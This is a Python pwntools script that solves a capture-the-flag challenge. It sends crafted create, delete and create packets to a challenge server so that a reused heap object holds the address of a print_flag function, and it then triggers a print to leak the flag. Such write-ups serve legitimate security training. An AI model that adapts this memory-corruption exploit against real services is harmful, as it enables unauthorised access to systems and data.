import socket
import proto_util
from pwn import *
LOGLEVEL = 'info'
TIMEOUT = 9999

def start():
    elf = context.binary = ELF('../challenge/server_binary')
    context.log_level = LOGLEVEL
    if args['REMOTE']:
        return remote('trellixhax-free-yo-radicals-part-ii.chals.io', 443, ssl=True)
    else:
        return remote('localhost', 8002)

def goto_wait_for_data(p, verb=False):
    msg = p.recvuntil(b'Waiting for data... \n', timeout=TIMEOUT)
    if msg == '':
        log.error('Failed to recv "waiting for data..." message')
        exit(1)
    if verb:
        print('Received data: %s' % msg.decode('utf-8'))

def exploit(p,addr):
    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=b'\x0cAAABBBBCCCCDDDD', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending delete')
    payload = proto_util.proto_packet(action='delete', data='foobar', value=1337)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending create')
    payload = proto_util.proto_packet(action='create', data=p32(0x04) + b'BBBB' + p64(addr), value=0x0c000000)
    p.send(payload)
    goto_wait_for_data(p)
    log.success('Sending print')
    payload = proto_util.proto_packet(action='print', value=1)
    p.send(payload)
    flag = p.recvuntil(b'}')
    log.success('Flag: %s' % flag.split()[-1].decode('utf-8'))
    #goto_wait_for_data(p, verb=True)
    goto_wait_for_data(p)

if __name__ == '__main__':
    p = start()

    if not p.recvuntil(b'\n') == b'Connected\n':
        log.error('Failed to connect')
    else:
        log.success('Connected')

    addr = 0x400d27
    log.success('Address of print_flag: %s' % hex(addr))
    exploit(p, addr)
    #normal()

